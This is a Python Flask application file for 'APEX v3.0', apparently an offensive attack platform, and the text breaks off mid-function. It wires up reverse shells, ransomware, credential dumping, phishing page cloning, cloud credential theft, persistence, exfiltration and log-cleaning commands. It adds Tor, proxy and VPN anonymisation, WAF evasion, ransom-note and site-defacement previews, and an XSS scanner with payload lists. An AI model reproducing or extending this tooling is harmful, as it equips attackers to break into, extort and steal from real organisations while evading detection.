import os, sys, json, time, threading, re, socket, base64, sqlite3, random, string
from datetime import datetime
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
from flask import Flask, render_template, request, jsonify, redirect, url_for, session, flash, send_file, make_response
from flask_socketio import SocketIO, emit
from flask_login import LoginManager, UserMixin, login_user, logout_user, login_required
from config import Config
import requests
from bs4 import BeautifulSoup
from openai import OpenAI

# Module imports
from modules.c2.beacon import C2Beacon, generate_reverse_shell
from modules.post_exploit.ransomware import RansomwareSimulator, run_ransomware_attack, run_ransomware_simulation, decrypt_ransomware
from modules.windows_ad.credential_dump import generate_mimikatz_script, generate_powershell_cred_dump, generate_kerberoast_script, generate_pass_the_hash_script, generate_golden_ticket_script
from modules.bruteforce.login_bruteforce import run_bruteforce, bruteforce_http_form, bruteforce_ssh, bruteforce_ftp
from modules.social.phishing_gen import generate_phishing_page, clone_custom_page, save_phishing_page, list_templates
from modules.cloud.aws_azure_gcp import steal_aws_credentials, steal_azure_credentials, steal_gcp_credentials, scan_cloud_metadata, exploit_ssrf_to_cloud
# New scanner imports
from modules.scanners.nosqli_scanner import scan_nosqli
from modules.scanners.api_scanner import scan_api
from modules.scanners.xxe_scanner import scan_xxe
from modules.scanners.prototype_pollution import scan_prototype_pollution
from modules.scanners.smuggling_scanner import scan_smuggling
from modules.scanners.oauth_scanner import scan_oauth
from modules.recon.admin_panel_finder import find_admin_panels
from modules.recon.sensitive_files import discover_sensitive_files
from modules.exploitation.exploit_chains import run_exploit_chain
# Core engine
from modules.core.engine import engine as adaptive_engine
from modules.evasion.waf_evasion import waf_evasion
# v3.0 New imports
from modules.core.nuke_engine import nuke_engine
from modules.core.ai_strategist import ai_strategist
from modules.core.polymorphic_engine import polymorphic_engine
from modules.evasion.stealth_traffic import stealth_traffic
from modules.evasion.defense_evasion import defense_evasion
from modules.post_exploit.persistence import persistence_engine
from modules.post_exploit.exfiltrator import exfiltrator
from modules.post_exploit.cleaner import cleaner
from modules.reporting.poc_generator import generate_poc_for_vuln, save_poc
from modules.recon.osint import osint_engine
from modules.core.browser_proxy import browser_proxy
from modules.core.target_search import target_search

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import warnings
warnings.filterwarnings('ignore')

app = Flask(__name__)
app.config.from_object(Config)
app.secret_key = Config.SECRET_KEY

socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')
login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = 'login'

scan_results = {}
live_feed = []

def init_db():
    os.makedirs('data', exist_ok=True)
    conn = sqlite3.connect('data/apex.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS scan_history (
        id TEXT PRIMARY KEY, target TEXT, scan_type TEXT,
        vulns_found INTEGER, critical INTEGER, high INTEGER, medium INTEGER, low INTEGER,
        exploits_run INTEGER, exploits_success INTEGER,
        started TEXT, completed TEXT, status TEXT, vulns_json TEXT
    )''')
    conn.commit()
    conn.close()

init_db()

class User(UserMixin):
    def __init__(self, id, email):
        self.id = id
        self.email = email

@login_manager.user_loader
def load_user(user_id):
    if user_id == '1':
        return User('1', Config.APEX_EMAIL)
    return None

# Adaptive rate limiting state
_rate_limit_state = {}

def get_session():
    session_obj = requests.Session()
    session_obj.verify = False
    # Use OpSec randomized headers if available
    try:
        from modules.evasion.opsec import opsec
        session_obj.headers.update(opsec.get_random_headers())
        opsec.apply_jitter()
    except:
        session_obj.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
        })
    # Adaptive rate limiting hooks
    def _check_rate_limit(resp, *args, **kwargs):
        host = urlparse(resp.url).netloc
        if host not in _rate_limit_state:
            _rate_limit_state[host] = {'backoff': 0, 'consecutive_429': 0}
        state = _rate_limit_state[host]
        if resp.status_code == 429:
            state['consecutive_429'] += 1
            state['backoff'] = min(30, (state['consecutive_429'] * 2))
            time.sleep(state['backoff'])
        elif resp.status_code == 503:
            state['backoff'] = 5
            time.sleep(5)
        elif resp.status_code == 200:
            state['consecutive_429'] = max(0, state['consecutive_429'] - 1)
            state['backoff'] = max(0, state['backoff'] - 0.5)
        return resp
    session_obj.hooks['response'].append(_check_rate_limit)
    if Config.TOR_ENABLED:
        session_obj.proxies = {
            'http': f'socks5h://127.0.0.1:{Config.TOR_SOCKS_PORT}',
            'https': f'socks5h://127.0.0.1:{Config.TOR_SOCKS_PORT}'
        }
        return session_obj
    if Config.PROXY_ENABLED:
        try:
            with open(Config.PROXY_LIST_FILE, 'r') as f:
                proxies = [l.strip() for l in f if l.strip() and not l.startswith('#')]
            if proxies:
                proxy = random.choice(proxies)
                session_obj.proxies = {'http': proxy, 'https': proxy}
        except: pass
    return session_obj

# ============================================================
# ROUTES
# ============================================================
@app.route('/')
def index():
    return render_template('landing.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email', '')
    password = request.form.get('password', '')
    if email == Config.APEX_EMAIL and password == Config.APEX_PASSWORD:
        user = User('1', email)
        login_user(user)
        session['authenticated'] = True
        return redirect(url_for('dashboard'))
    flash('ACCESS DENIED', 'error')
    return redirect(url_for('index'))

@app.route('/logout')
@login_required
def logout():
    logout_user()
    session.clear()
    return redirect(url_for('index'))

@app.route('/dashboard')
@login_required
def dashboard():
    return render_template('dashboard.html')

@app.route('/ransomware/preview')
@login_required
def ransomware_preview():
    return render_template('ransomware_preview.html')

@app.route('/api/scan', methods=['POST'])
@login_required
def start_scan():
    data = request.get_json()
    target = data.get('target', '')
    scan_type = data.get('scan_type', 'full')
    if not target: return jsonify({'error': 'No target specified'}), 400
    if not target.startswith('http'): target = 'https://' + target
    scan_id = f"scan_{int(time.time())}"
    scan_results[scan_id] = {
        'id': scan_id, 'target': target, 'type': scan_type,
        'status': 'running', 'started': datetime.now().isoformat(),
        'vulnerabilities': [], 'progress': 0
    }
    thread = threading.Thread(target=run_full_scan, args=(scan_id, target, scan_type))
    thread.daemon = True
    thread.start()
    return jsonify({'scan_id': scan_id, 'status': 'started'})

@app.route('/api/scan/<scan_id>/status')
@login_required
def scan_status(scan_id):
    if scan_id in scan_results: return jsonify(scan_results[scan_id])
    return jsonify({'error': 'Scan not found'}), 404

@app.route('/api/exploit', methods=['POST'])
@login_required
def start_exploit():
    data = request.get_json()
    scan_id = data.get('scan_id', '')
    vulnerabilities = data.get('vulnerabilities', [])
    if not vulnerabilities: return jsonify({'error': 'No vulnerabilities selected'}), 400
    exploit_id = f"exploit_{int(time.time())}"
    thread = threading.Thread(target=run_exploits, args=(exploit_id, scan_id, vulnerabilities))
    thread.daemon = True
    thread.start()
    return jsonify({'exploit_id': exploit_id, 'status': 'started'})

@app.route('/api/proxy/toggle', methods=['POST'])
@login_required
def toggle_proxy():
    data = request.get_json()
    Config.PROXY_ENABLED = data.get('enabled', False)
    emit_feed('system', f'Proxy chain {"ENABLED" if Config.PROXY_ENABLED else "DISABLED"}', 'info')
    return jsonify({'proxy_enabled': Config.PROXY_ENABLED})

@app.route('/api/tor/toggle', methods=['POST'])
@login_required
def toggle_tor():
    data = request.get_json()
    enabled = data.get('enabled', False)
    Config.TOR_ENABLED = enabled
    
    if enabled:
        # Actually verify Tor is running by testing the SOCKS port
        try:
            import socks
            s = socks.socksocket()
            s.settimeout(5)
            s.connect(('127.0.0.1', Config.TOR_SOCKS_PORT))
            s.close()
            emit_feed('system', f'🟢 Tor ENABLED — SOCKS port {Config.TOR_SOCKS_PORT} verified', 'success')
            return jsonify({'tor_enabled': True, 'verified': True})
        except Exception as e:
            emit_feed('system', f'🔴 Tor toggle ON but SOCKS port {Config.TOR_SOCKS_PORT} not reachable. Start Tor first: systemctl start tor', 'error')
            Config.TOR_ENABLED = False
            return jsonify({'tor_enabled': False, 'verified': False, 'error': f'Tor SOCKS port not reachable. Run: systemctl start tor'})
    else:
        emit_feed('system', 'Tor DISABLED', 'info')
        return jsonify({'tor_enabled': False, 'verified': False})

@app.route('/api/vpn/toggle', methods=['POST'])
@login_required
def toggle_vpn():
    data = request.get_json()
    enabled = data.get('enabled', False)
    try:
        from modules.anonymity.vpn_manager import vpn_manager
        if enabled:
            vpn_manager.enabled = True
            Config.VPN_ENABLED = True
            vpn_manager.original_ip = vpn_manager._get_public_ip()
            
            # Check if Warp is connected (primary method)
            warp_connected = False
            try:
                import subprocess
                result = subprocess.run(['warp-cli', 'status'], capture_output=True, text=True, timeout=5)
                warp_connected = 'Connected' in result.stdout
            except Exception as warp_err:
                print(f"[VPN] warp-cli check failed: {warp_err}")
            
            if warp_connected:
                vpn_manager.interface = 'CloudflareWarp'
                vpn_manager.current_ip = vpn_manager._get_public_ip()
                # Warp is connected — trust it regardless of IP comparison
                emit_feed('system', f'🟢 VPN PROTECTED via Warp — IP: {vpn_manager.current_ip}', 'success')
                protection = {
                    'protected': True,
                    'current_ip': vpn_manager.current_ip,
                    'original_ip': vpn_manager.original_ip,
                    'interface': 'CloudflareWarp',
                    'method': 'warp-cli'
                }
                socketio.emit('vpn_status', protection)
                return jsonify({'vpn_enabled': True, 'vpn_active': True, 'protected': True, 'current_ip': vpn_manager.current_ip})
            
            # Fallback: use improved is_vpn_active() which checks multiple methods
            if vpn_manager.is_vpn_active():
                vpn_manager.current_ip = vpn_manager._get_public_ip()
                protection = vpn_manager.verify_protection()
                if protection.get('protected'):
                    emit_feed('system', f'🟢 VPN PROTECTED — IP: {vpn_manager.current_ip}', 'success')
                    socketio.emit('vpn_status', protection)
                    return jsonify({'vpn_enabled': True, 'vpn_active': True, 'protected': True, 'current_ip': vpn_manager.current_ip})
            
            # Always accept the toggle — show warning but don't revert
            emit_feed('system', '🟡 VPN toggled ON but no VPN interface detected. Run: warp-cli connect', 'warning')
            return jsonify({'vpn_enabled': True, 'vpn_active': False, 'protected': False, 'reason': 'No VPN detected, toggle accepted'})
        else:
            vpn_manager.disable()
            Config.VPN_ENABLED = False
            emit_feed('system', 'VPN DISABLED', 'info')
            return jsonify({'vpn_enabled': False, 'vpn_active': False})
    except Exception as e:
        Config.VPN_ENABLED = enabled
        emit_feed('system', f'VPN {"ENABLED" if Config.VPN_ENABLED else "DISABLED"}', 'info')
        return jsonify({'vpn_enabled': Config.VPN_ENABLED, 'vpn_active': Config.VPN_ENABLED, 'error': str(e)})

@app.route('/api/vpn/status', methods=['GET'])
@login_required
def api_vpn_status():
    try:
        from modules.anonymity.vpn_manager import vpn_manager
        status = vpn_manager.get_status()
        protection = vpn_manager.verify_protection()
        status['protected'] = protection.get('protected', False)
        return jsonify(status)
    except:
        return jsonify({'enabled': Config.VPN_ENABLED, 'active': False, 'current_ip': 'Unknown', 'protected': False})

@app.route('/api/vpn/verify', methods=['GET'])
@login_required
def api_vpn_verify():
    """Verify VPN protection status"""
    try:
        from modules.anonymity.vpn_manager import vpn_manager
        protection = vpn_manager.verify_protection()
        return jsonify(protection)
    except:
        return jsonify({'protected': False, 'reason': 'VPN manager not available'})

# ============================================================
# OPSEC ENDPOINTS
# ============================================================
@app.route('/api/opsec/status', methods=['GET'])
@login_required
def api_opsec_status():
    """Get full anonymity/OpSec status"""
    try:
        from modules.evasion.opsec import opsec
        status = opsec.get_anonymity_status()
        return jsonify(status)
    except:
        return jsonify({'protected': False, 'warnings': ['OpSec module not available']})

@app.route('/api/opsec/logcleaner', methods=['GET'])
@login_required
def api_opsec_logcleaner():
    """Get log cleaning commands for target"""
    target_os = request.args.get('os', 'linux')
    try:
        from modules.evasion.opsec import opsec
        commands = opsec.generate_log_cleaner_commands(target_os)
        return jsonify({'commands': commands, 'target_os': target_os})
    except:
        return jsonify({'commands': [], 'error': 'OpSec module not available'})

@app.route('/api/opsec/tor_verify', methods=['GET'])
@login_required
def api_opsec_tor_verify():
    """Verify Tor routing"""
    try:
        from modules.evasion.opsec import opsec
        is_tor = opsec.verify_tor_routing()
        exit_ip = opsec.get_tor_exit_ip() if is_tor else 'N/A'
        return jsonify({'tor_active': is_tor, 'exit_ip': exit_ip})
    except:
        return jsonify({'tor_active': False, 'exit_ip': 'N/A'})

@app.route('/api/opsec/full_report', methods=['GET'])
@login_required
def api_opsec_full_report():
    """Get comprehensive anonymity report for dashboard panel"""
    try:
        from modules.evasion.opsec import opsec
        report = opsec.get_full_anonymity_report()
        return jsonify(report)
    except Exception as e:
        return jsonify({
            'status': 'exposed',
            'status_text': '🔴 ERROR',
            'status_color': '#ef4444',
            'layers': [],
            'checks': {},
            'warnings': [f'OpSec module error: {str(e)}'],
            'recommendations': ['Check server logs for details'],
            'current_ip': 'Unknown',
            'real_ip': 'Unknown',
            'ip_match': None
        })

@app.route('/api/opsec/dns_enforce', methods=['GET'])
@login_required
def api_opsec_dns_enforce():
    """Get DNS leak protection enforcement status and commands"""
    try:
        from modules.evasion.opsec import opsec
        result = opsec.enforce_dns_protection()
        return jsonify(result)
    except:
        return jsonify({'enforced': False, 'method': 'none', 'commands': [], 'warning': 'OpSec module unavailable'})

# ============================================================
# NEW SCANNER ENDPOINTS
# ============================================================
@app.route('/api/scan/admin_panels', methods=['POST'])
@login_required
def api_admin_panel_finder():
    """Find admin panels on target"""
    data = request.get_json()
    target = data.get('target', '')
    if not target: return jsonify({'error': 'Target required'}), 400
    if not target.startswith('http'): target = 'https://' + target
    try:
        from modules.recon.admin_panel_finder import find_admin_panels
        panels = find_admin_panels(target)
        emit_feed('admin_finder', f'Admin panel scan: {len(panels)} found on {target}', 'success' if panels else 'info')
        return jsonify({'target': target, 'panels': panels, 'count': len(panels)})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/scan/sensitive_files', methods=['POST'])
@login_required
def api_sensitive_files():
    """Discover sensitive files on target"""
    data = request.get_json()
    target = data.get('target', '')
    if not target: return jsonify({'error': 'Target required'}), 400
    if not target.startswith('http'): target = 'https://' + target
    try:
        from modules.recon.sensitive_files import discover_sensitive_files
        files = discover_sensitive_files(target)
        emit_feed('sensitive_files', f'Sensitive file scan: {len(files)} found on {target}', 'success' if files else 'info')
        return jsonify({'target': target, 'files': files, 'count': len(files)})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/scan/nosqli', methods=['POST'])
@login_required
def api_scan_nosqli():
    """Run NoSQL injection scan"""
    data = request.get_json()
    target = data.get('target', '')
    if not target: return jsonify({'error': 'Target required'}), 400
    if not target.startswith('http'): target = 'https://' + target
    try:
        from modules.scanners.nosqli_scanner import scan_nosqli
        discovered = {'pages': [target], 'forms': []}
        vulns = scan_nosqli(target, discovered)
        return jsonify({'target': target, 'vulnerabilities': vulns, 'count': len(vulns)})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/scan/api', methods=['POST'])
@login_required
def api_scan_api():
    """Run API hacking scan (GraphQL, JWT, Mass Assignment, OpenAPI)"""
    data = request.get_json()
    target = data.get('target', '')
    if not target: return jsonify({'error': 'Target required'}), 400
    if not target.startswith('http'): target = 'https://' + target
    try:
        from modules.scanners.api_scanner import scan_api
        discovered = {'pages': [target], 'forms': []}
        vulns = scan_api(target, discovered)
        return jsonify({'target': target, 'vulnerabilities': vulns, 'count': len(vulns)})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/scan/xxe', methods=['POST'])
@login_required
def api_scan_xxe():
    """Run XXE injection scan"""
    data = request.get_json()
    target = data.get('target', '')
    if not target: return jsonify({'error': 'Target required'}), 400
    if not target.startswith('http'): target = 'https://' + target
    try:
        from modules.scanners.xxe_scanner import scan_xxe
        discovered = {'pages': [target], 'forms': []}
        vulns = scan_xxe(target, discovered)
        return jsonify({'target': target, 'vulnerabilities': vulns, 'count': len(vulns)})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/scan/prototype_pollution', methods=['POST'])
@login_required
def api_scan_prototype_pollution():
    """Run prototype pollution scan"""
    data = request.get_json()
    target = data.get('target', '')
    if not target: return jsonify({'error': 'Target required'}), 400
    if not target.startswith('http'): target = 'https://' + target
    try:
        from modules.scanners.prototype_pollution import scan_prototype_pollution
        discovered = {'pages': [target], 'forms': []}
        vulns = scan_prototype_pollution(target, discovered)
        return jsonify({'target': target, 'vulnerabilities': vulns, 'count': len(vulns)})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/scan/smuggling', methods=['POST'])
@login_required
def api_scan_smuggling():
    """Run HTTP request smuggling scan"""
    data = request.get_json()
    target = data.get('target', '')
    if not target: return jsonify({'error': 'Target required'}), 400
    if not target.startswith('http'): target = 'https://' + target
    try:
        from modules.scanners.smuggling_scanner import scan_smuggling
        discovered = {'pages': [target], 'forms': []}
        vulns = scan_smuggling(target, discovered)
        return jsonify({'target': target, 'vulnerabilities': vulns, 'count': len(vulns)})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/scan/oauth', methods=['POST'])
@login_required
def api_scan_oauth():
    """Run Open Redirect + OAuth scan"""
    data = request.get_json()
    target = data.get('target', '')
    if not target: return jsonify({'error': 'Target required'}), 400
    if not target.startswith('http'): target = 'https://' + target
    try:
        from modules.scanners.oauth_scanner import scan_oauth
        discovered = {'pages': [target], 'forms': []}
        vulns = scan_oauth(target, discovered)
        return jsonify({'target': target, 'vulnerabilities': vulns, 'count': len(vulns)})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/exploit/chains', methods=['POST'])
@login_required
def api_exploit_chains():
    """Run automated exploit chains"""
    data = request.get_json()
    target = data.get('target', '')
    vulnerabilities = data.get('vulnerabilities', [])
    chain_name = data.get('chain_name', None)
    if not target or not vulnerabilities:
        return jsonify({'error': 'Target and vulnerabilities required'}), 400
    try:
        from modules.exploitation.exploit_chains import run_exploit_chain
        results = run_exploit_chain(target, vulnerabilities, chain_name)
        emit_feed('chains', f'Exploit chains executed on {target}', 'success')
        return jsonify({'target': target, 'chains': results})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/core/fingerprint', methods=['POST'])
@login_required
def api_core_fingerprint():
    """Fingerprint target using adaptive engine"""
    data = request.get_json()
    target = data.get('target', '')
    if not target: return jsonify({'error': 'Target required'}), 400
    if not target.startswith('http'): target = 'https://' + target
    try:
        from modules.core.engine import engine
        fp = engine.fingerprint_target(target)
        return jsonify({'target': target, 'fingerprint': fp})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/core/discovery', methods=['POST'])
@login_required
def api_core_discovery():
    """Run deep discovery on target"""
    data = request.get_json()
    target = data.get('target', '')
    if not target: return jsonify({'error': 'Target required'}), 400
    if not target.startswith('http'): target = 'https://' + target
    try:
        from modules.core.discovery import discovery
        result = discovery.full_discovery(target)
        return jsonify({'target': target, 'discovery': result})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/evasion/encode', methods=['POST'])
@login_required
def api_evasion_encode():
    """Apply WAF evasion encoding to a payload"""
    data = request.get_json()
    payload = data.get('payload', '')
    vuln_type = data.get('vuln_type', 'xss')
    waf = data.get('waf', None)
    level = data.get('level', 2)
    if not payload: return jsonify({'error': 'Payload required'}), 400
    try:
        from modules.evasion.waf_evasion import waf_evasion
        encoded = waf_evasion.apply_evasion(payload, vuln_type, waf, level)
        variants = waf_evasion.generate_evasion_variants(payload, vuln_type, waf) if hasattr(waf_evasion, 'generate_evasion_variants') else []
        return jsonify({'original': payload, 'encoded': encoded, 'variants': variants[:10]})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/ransomware/preview', methods=['POST'])
@login_required
def api_ransomware_preview():
    data = request.get_json()
    html = render_template('ransomware_note.html',
        title=data.get('title', 'YOUR FILES HAVE BEEN ENCRYPTED'),
        message=data.get('message', ''), image_url=data.get('image_url', ''),
        group_name=data.get('group_name', 'APEX'), encryption_id=data.get('encryption_id', ''),
        file_count=data.get('file_count', ''), total_size=data.get('total_size', ''))
    return jsonify({'html': html})

@app.route('/api/deface/preview', methods=['POST'])
@login_required
def api_deface_preview():
    """Generate XSS deface preview HTML."""
    data = request.get_json()
    message = data.get('message', 'This site has been compromised.')
    image_url = data.get('image_url', '')
    target_url = data.get('target_url', 'https://example.com')
    
    html = f'''<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Hacked</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box;}}
body{{background:#0a0a0a;color:#e5e5e5;font-family:'Courier New',monospace;display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center;}}
.deface-card{{background:#0f0f0f;border:2px solid #f97316;padding:40px;max-width:600px;box-shadow:0 0 40px rgba(249,115,22,0.3);}}
.deface-title{{font-size:36px;font-weight:900;color:#f97316;letter-spacing:6px;text-shadow:0 0 20px rgba(249,115,22,0.5);margin-bottom:20px;}}
.deface-msg{{font-size:16px;color:#d4d4d4;line-height:1.8;margin-bottom:20px;white-space:pre-wrap;}}
.deface-img{{max-width:300px;max-height:200px;border:2px solid #f97316;margin:20px auto;display:block;}}
.deface-footer{{font-size:12px;color:#6b7280;margin-top:20px;}}
.deface-url{{font-size:10px;color:#4a4d5a;margin-top:10px;}}
</style></head><body><div class="deface-card">
<div class="deface-title">🔺 HACKED</div>
<div class="deface-msg">{message}</div>
{('<img class="deface-img" src="' + image_url + '" alt="Deface">') if image_url else ''}
<div class="deface-url">Target: {target_url}</div>
<div class="deface-footer">APEX v3.0 // Security breach detected</div>
</div></body></html>'''
    
    return jsonify({'html': html})

@app.route('/api/ransomware/upload_image', methods=['POST'])
@login_required
def upload_ransomware_image():
    if 'image' not in request.files: return jsonify({'error': 'No image'}), 400
    file = request.files['image']
    if file.filename == '': return jsonify({'error': 'No file'}), 400
    upload_dir = os.path.join('static', 'uploads')
    os.makedirs(upload_dir, exist_ok=True)
    filename = f'ransomware_img_{int(time.time())}.png'
    filepath = os.path.join(upload_dir, filename)
    file.save(filepath)
    with open(filepath, 'rb') as f: img_data = base64.b64encode(f.read()).decode()
    return jsonify({'url': f'/static/uploads/{filename}', 'base64': f'data:image/png;base64,{img_data}'})

@app.route('/api/feed')
@login_required
def get_feed():
    return jsonify(live_feed[-100:])

@app.route('/api/history')
@login_required
def get_history():
    conn = sqlite3.connect('data/apex.db')
    c = conn.cursor()
    c.execute('SELECT * FROM scan_history ORDER BY started DESC LIMIT 50')
    rows = c.fetchall()
    conn.close()
    history = []
    for row in rows:
        history.append({
            'id': row[0], 'target': row[1], 'scan_type': row[2],
            'vulns_found': row[3], 'critical': row[4], 'high': row[5],
            'medium': row[6], 'low': row[7], 'exploits_run': row[8],
            'exploits_success': row[9], 'started': row[10], 'completed': row[11], 'status': row[12]
        })
    return jsonify(history)

@app.route('/api/history/<scan_id>')
@login_required
def get_history_detail(scan_id):
    conn = sqlite3.connect('data/apex.db')
    c = conn.cursor()
    c.execute('SELECT * FROM scan_history WHERE id=?', (scan_id,))
    row = c.fetchone()
    conn.close()
    if row:
        return jsonify({
            'id': row[0], 'target': row[1], 'scan_type': row[2],
            'vulns_found': row[3], 'critical': row[4], 'high': row[5],
            'medium': row[6], 'low': row[7], 'exploits_run': row[8],
            'exploits_success': row[9], 'started': row[10], 'completed': row[11],
            'status': row[12], 'vulns_json': row[13]
        })
    return jsonify({'error': 'Not found'}), 404

# ============================================================
# UPGRADED CRAWLER (Deep Spidering)
# ============================================================
COMMON_PATHS = ['/admin', '/login', '/wp-admin', '/api', '/debug', '/test', '/backup',
                '/frame', '/upload', '/images', '/css', '/js', '/robots.txt', '/sitemap.xml',
                '/.git/HEAD', '/.env', '/config', '/phpinfo.php', '/info.php', '/status',
                '/console', '/dashboard', '/panel', '/cpanel', '/webmail', '/phpmyadmin',
                '/wp-login.php', '/administrator', '/user', '/users', '/account',
                '/api/v1', '/api/v2', '/graphql', '/swagger', '/docs', '/redoc',
                '/.well-known/security.txt', '/crossdomain.xml', '/clientaccesspolicy.xml']

def crawl_target(base_url, max_pages=50):
    discovered = {'pages': [], 'forms': [], 'params': set(), 'endpoints': set()}
    visited = set()
    to_visit = [(base_url, 0)]
    sess = get_session()
    base_parsed = urlparse(base_url)
    base_domain = base_parsed.netloc
    
    # Also add common paths to discover
    if Config.CRAWL_COMMON_PATHS:
        for path in COMMON_PATHS:
            to_visit.append((urljoin(base_url, path), 0))
    
    while to_visit and len(visited) < max_pages:
        url, depth = to_visit.pop(0)
        if url in visited: continue
        if depth > Config.CRAWL_DEPTH: continue
        try:
            r = sess.get(url, timeout=8, allow_redirects=True)
            visited.add(url)
            discovered['pages'].append(url)
            soup = BeautifulSoup(r.text, 'html.parser')
            
            # Extract links
            for link in soup.find_all('a', href=True):
                href = urljoin(url, link['href'])
                parsed = urlparse(href)
                if parsed.netloc == base_domain and href not in visited:
                    to_visit.append((href, depth + 1))
                if parsed.query:
                    for param in parse_qs(parsed.query).keys():
                        discovered['params'].add(param)
            
            # Extract iframe/frame src
            for frame in soup.find_all(['iframe', 'frame'], src=True):
                src = urljoin(url, frame['src'])
                parsed = urlparse(src)
                if parsed.netloc == base_domain and src not in visited:
                    to_visit.append((src, depth + 1))
                    discovered['endpoints'].add(src)
            
            # Extract forms
            for form in soup.find_all('form'):
                action = form.get('action', '')
                method = form.get('method', 'get').lower()
                form_url = urljoin(url, action) if action else url
                inputs = []
                for inp in form.find_all(['input', 'textarea', 'select']):
                    name = inp.get('name', '')
                    if name:
                        inputs.append({'name': name, 'type': inp.get('type', 'text')})
                        discovered['params'].add(name)
                discovered['forms'].append({'url': form_url, 'method': method, 'inputs': inputs})
                discovered['endpoints'].add(form_url)
            
            # Extract script sources
            for script in soup.find_all('script', src=True):
                discovered['endpoints'].add(urljoin(url, script['src']))
            
            # Try to parse sitemap
            if url.endswith('sitemap.xml'):
                try:
                    sitemap_soup = BeautifulSoup(r.text, 'xml')
                    for loc in sitemap_soup.find_all('loc'):
                        loc_url = loc.text.strip()
                        if urlparse(loc_url).netloc == base_domain and loc_url not in visited:
                            to_visit.append((loc_url, depth))
                except: pass
            
            # Try to parse robots.txt
            if url.endswith('robots.txt'):
                for line in r.text.split('\n'):
                    if line.lower().startswith('allow:') or line.lower().startswith('disallow:'):
                        path = line.split(':', 1)[1].strip()
                        if path and path != '/':
                            full_url = urljoin(base_url, path)
                            if full_url not in visited:
                                to_visit.append((full_url, depth))
        except: pass
    
    discovered['params'] = list(discovered['params'])
    discovered['endpoints'] = list(discovered['endpoints'])
    return discovered

# ============================================================
# REFLECTION FINDER
# ============================================================
def find_reflection_context(sess, url, param, method='get'):
    unique_id = 'APEX' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    try:
        if method == 'post':
            r = sess.post(url, data={param: unique_id}, timeout=5)
        else:
            parsed = urlparse(url)
            params = parse_qs(parsed.query) if parsed.query else {}
            params[param] = [unique_id]
            new_query = urlencode(params, doseq=True)
            test_url = urlunparse(parsed._replace(query=new_query))
            r = sess.get(test_url, timeout=5)
        text = r.text
        if unique_id not in text: return None
        idx = text.find(unique_id)
        before = text[max(0, idx-200):idx]
        context = 'html_body'
        script_match = re.search(r'<script[^>]*>([^<]{0,100})$', before)
        if script_match and '</script>' not in before[-100:]:
            context = 'script_tag'
        attr_match = re.search(r'(\w+)=["\']([^"\']{0,50})$', before)
        if attr_match:
            return {'context': 'html_attribute', 'attr_name': attr_match.group(1), 'reflected': True}
        if '<!--' in before[-50:] and '-->' not in before[-50:]:
            context = 'html_comment'
        return {'context': context, 'reflected': True}
    except: return None

# ============================================================
# MULTI-STRATEGY SCANNERS
# ============================================================
def scan_xss(target_url, discovered):
    vulns = []
    sess = get_session()
    payloads_by_context = {
        'html_body': ['<script>alert("APEX")</script>','<img src=x onerror=alert("APEX")>','<svg onload=alert("APEX")>','<body onload=alert("APEX")>'],
        'html_attribute': ['" onmouseover="alert(\'APEX\')" x="','\' onfocus="alert(\'APEX\')" autofocus \'','"><script>alert("APEX")</script>','" autofocus onfocus="alert(\'APEX\')" x="'],
        'script_tag': ['";alert("APEX");//',"';alert('APEX');//",'";alert(String.fromCharCode(65,80,69,88));//','</script><script>alert("APEX")</script>'],
        'html_comment': ['--><script>alert("APEX")</script><!--','--><img src=x onerror=alert("APEX")><!--'],
    }
    generic_payloads = ['<script>alert("APEX")</script>','"><script>alert("APEX")</script>','<img src=x onerror=alert("APEX")>','"><img src=x onerror=alert("APEX")>','<svg onload=alert("APEX")>','"><svg onload=alert("APEX")>','<ScRiPt>alert("APEX")</ScRiPt>','%3Cscript%3Ealert(%22APEX%22)%3C/script%3E','" onmouseover="alert(\'APEX\')" x="','javascript:alert("APEX")']
    
    # Also scan iframe src URLs if they exist in discovered endpoints
    all_pages = list(discovered['pages'][:10])
    if discovered.get('endpoints'):
        for ep in discovered['endpoints']:
            if ep not in all_pages:
                all_pages.append(ep)
    
    for page in all_pages[:15]:
        parsed = urlparse(page)
        if parsed.query:
            params = parse_qs(parsed.query)
            for param in list(params.keys())[:5]:
                ctx = find_reflection_context(sess, page, param)
                if ctx and ctx.get('reflected'):
                    context = ctx.get('context', 'html_body')
                    payloads = payloads_by_context.get(context, generic_payloads)
                    for payload in payloads[:5]:
                        try:
                            test_params = params.copy()
                            test_params[param] = [payload]
                            new_query = urlencode(test_params, doseq=True)
                            test_url = urlunparse(parsed._replace(query=new_query))
                            r = sess.get(test_url, timeout=5)
                            if payload in r.text or ('alert' in r.text and 'APEX' in r.text):
                                vulns.append({'type':'xss','subtype':'reflected','endpoint':page,'parameter':param,'payload':payload,'context':context,'result':f'Payload reflected in {context}','confirmed':True,'severity':'high','target':target_url,'description':f'Reflected XSS via {param} in {context}.'})
                                break
                        except: pass
                else:
                    for payload in generic_payloads[:5]:
                        try:
                            test_params = params.copy()
                            test_params[param] = [payload]
